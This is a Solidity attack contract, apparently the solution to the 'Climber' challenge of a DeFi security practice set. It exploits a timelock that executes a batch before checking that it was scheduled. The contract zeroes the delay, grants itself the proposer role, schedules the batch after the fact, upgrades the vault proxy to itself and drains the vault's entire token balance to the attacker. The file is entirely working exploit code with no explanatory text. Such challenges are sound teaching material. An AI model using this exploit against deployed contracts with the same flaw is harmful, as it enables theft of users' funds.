// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "hardhat/console.sol";

contract ClimberAttacker {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant salt = keccak256("SALT");
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    ClimberTimelock immutable timelock;
    ClimberVault immutable vault;
    address tokenAddress;
    address owner;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address _timelock,
        address _vault,
        address _tokenAddress
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        tokenAddress = _tokenAddress;
        owner = msg.sender;
    }

    function preparePayloads() private {
        {
            bytes memory updateDelayData = abi.encodeWithSignature(
                "updateDelay(uint64)",
                uint64(0)
            );
            targets.push(address(timelock));
            values.push(uint256(0));
            dataElements.push(updateDelayData);
        }
        {
            bytes memory grantRoleData = abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            );
            targets.push(address(timelock));
            values.push(uint256(0));
            dataElements.push(grantRoleData);
        }
        {
            bytes memory callbackData = abi.encodeWithSignature(
                "makeScheduleCallback()"
            );
            targets.push(address(this));
            values.push(uint256(0));
            dataElements.push(callbackData);
        }
        {
            bytes memory upgradeVaultData = abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeWithSignature(
                    "makeTransfer(address,address)",
                    tokenAddress,
                    owner
                )
            );
            targets.push(address(vault));
            values.push(uint256(0));
            dataElements.push(upgradeVaultData);
        }
    }

    function makeScheduleCallback() external {
        timelock.schedule(targets, values, dataElements, salt);
    }

    function exploit() external {
        preparePayloads();
        timelock.execute(targets, values, dataElements, salt);
    }

    function makeTransfer(address token, address account)
        external
        returns (bool)
    {
        require(
            IERC20(token).transfer(
                account,
                IERC20(token).balanceOf(address(this))
            ),
            "transfer failed"
        );
        return true;
    }

    function upgradeTo(address oldImplementation) external returns (bool) {
        assembly {
            sstore(IMPLEMENTATION_SLOT, oldImplementation)
        }

        return true;
    }
}
